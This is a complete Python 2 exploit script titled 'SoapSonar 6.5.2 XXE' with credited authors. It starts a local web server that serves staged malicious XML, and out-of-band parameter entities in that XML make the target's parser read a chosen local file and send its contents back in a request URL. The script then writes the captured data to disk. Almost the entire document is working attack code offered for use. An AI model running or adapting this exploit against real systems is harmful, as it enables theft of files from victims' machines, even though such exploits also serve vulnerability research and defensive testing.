#[Authors]: Ben 'highjack' Sheppard (@highjack_) & Rob Daniel (@_drxp)
#[Title]: SoapSonar 6.5.2 XXE
#[Usage]: sudo python soapsonar.py localfile 
#[Special Thanks]: Alexey Osipov (@GiftsUngiven), Timur Yunusov (@a66at) thanks for the awesome OOB techniques :) and Dade Murphy
#[Vendor URL]: http://www.crosschecknet.com/products/soapsonar.php 

import BaseHTTPServer, argparse, socket, sys, urllib, os, ntpath
localPort = 0
localIP = ""
localFile = ""

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    print """
                 _ ._  _ , _ ._
               (_ ' ( `  )_  .__)
             ( (  (    )   `)  ) _)
            (__ (_   (_ . _) _) ,__)
                `~~`\ ' . /`~~`
                ,::: ;   ; :::,
               ':::::::::::::::'
          __________/_ __ \____________

       [Title] SoapSonar 6.5.2 XXE exploit
      [Authors] Ben Sheppard & Rob Daniel
"""
    global localIP
    localIP = socket.gethostbyname(socket.gethostname())
   
    parser = argparse.ArgumentParser()
    parser.add_argument("file", help="set local file to extract data from", action="store")
    parser.add_argument("--port", help="port number for web server to listen on", action="store", default=80)
    parser.add_argument("--iface", help="specify the interface to listen on", action="store", default="eth0")
    args = parser.parse_args()
	
    if localIP.startswith("127."):
        ipCommand =  "ifconfig " + args.iface + " | grep -Eo 'inet addr:[0-9]{1,3}.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -f 2 -d :"
        ipOutput = os.popen(ipCommand)
        localIP = ipOutput.readline().replace("\n","")

    global localFile
    localFile = args.file
    #localFile = localFile.replace("\\","\\\\")
    global localPort
    localPort = int(args.port)
    print "[+] Malicious xml file is located at http://" + localIP + ":" + str(localPort )+ "/stage1.xml"
		
    def log_request(self, *args, **kwargs):
        pass

    def do_GET(s):
		pageContent = ""
		if "/stage1.xml" in s.path:
			print "[+] Receiving stage1 request"
			pageContent = "<?xml version=\"1.0\"	encoding=\"utf-8\"?>	<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://" + localIP +":" +  str(localPort)	+ "/stage2.xml\">%remote;%int;%trick;]>"
		elif "/stage2.xml" in s.path:
			print "[+] Receiving stage2 request"
			global localFile
			pageContent = "<!ENTITY % payl SYSTEM \"" + localFile + "\">	<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://" + localIP + ":"+  str(localPort) + "?%payl;'>\">"
		else:
			print "[+] Saving contents of " + localFile + " to " + os.path.dirname(os.path.abspath(__file__))
			pageContent = ""
			localFile = ntpath.basename(localFile)
			fo = open(localFile, "wb")
			try:
				fo.write(urllib.unquote(s.path).decode('utf8'));
			except Exception,e: 
				print str(e)
			fo.close()
			#print urllib.unquote(s.path).decode('utf8')
			print "[+] Completed - Press any key to close"
			raw_input()
			try:
				httpd.server_close()
			except:
			 pass
		s.send_response(200)
		s.send_header("Content-type", "text/html")
		s.end_headers()
		s.wfile.write(pageContent)
      

if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class(('', localPort), MyHandler)
    
    try:
        httpd.serve_forever()
    except:
        pass
    httpd.server_close()
      

